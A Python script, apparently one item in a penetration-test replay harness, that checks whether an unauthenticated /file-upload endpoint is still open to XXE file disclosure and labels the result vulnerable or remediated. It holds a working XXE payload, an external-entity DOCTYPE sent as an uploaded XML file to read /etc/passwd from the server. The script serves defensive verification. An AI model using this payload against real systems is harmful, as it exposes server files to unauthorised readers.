#!/usr/bin/env python3
"""pt17: XXE file disclosure via the unauthenticated /file-upload endpoint.

POST /file-upload needs no authentication at all and parses an
uploaded .xml file with external entity resolution enabled. A DOCTYPE
defining an external SYSTEM entity gets resolved and reflected back in
the response's own deprecation error message.

Deliberately tests only the one-shot file-disclosure variant. The
vendor's own code carries a caution comment next to this parser ("XXE
attacks in Docker/Heroku containers regularly cause segfault
crashes"); the DoS/billion-laughs variant is never attempted here,
this container is shared with every other item in this repo.

Standard library only (urllib, json); builds the multipart/form-data
body by hand since urllib has no high-level multipart support.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt17-001.json"
BOUNDARY = "flatline-pt17-boundary"


def _multipart_body(filename: str, xml_content: str) -> bytes:
    parts = [
        f"--{BOUNDARY}",
        f'Content-Disposition: form-data; name="file"; filename="{filename}"',
        "Content-Type: text/xml",
        "",
        xml_content,
        f"--{BOUNDARY}--",
        "",
    ]
    return "\r\n".join(parts).encode()


def _upload(target: str, filename: str, xml_content: str) -> tuple[int, str]:
    body = _multipart_body(filename, xml_content)
    req = urllib.request.Request(f"{target}/file-upload", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={BOUNDARY}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)

    xxe_xml = (
        '<?xml version="1.0" encoding="ISO-8859-1"?>'
        '<!DOCTYPE foo [ <!ELEMENT foo ANY> '
        f'<!ENTITY xxe SYSTEM "{blueprint["xxe_payload_entity_target"]}"> ]>'
        "<foo>&xxe;</foo>"
    )
    exploit_status, exploit_body = _upload(target, "complaint.xml", xxe_xml)
    file_disclosed = "root:x:0:0" in exploit_body

    if exploit_status in (400, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif file_disclosed:
        status = "VULNERABLE"
        summary = "The real contents of /etc/passwd came back in the upload's own error response."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, file_disclosed={file_disclosed}."

    benign_xml = '<?xml version="1.0"?><complaint><text>pt17 benign complaint, no DOCTYPE</text></complaint>'
    legit_status, legit_body = _upload(target, "benign-complaint.xml", benign_xml)
    legitimate_benign_upload_reached_backend = legit_status != 403  # our control's own block code, not the backend's own responses

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_benign_upload_reached_backend": legitimate_benign_upload_reached_backend,
        "legitimate_benign_upload_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt17-xxe-file-disclosure", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
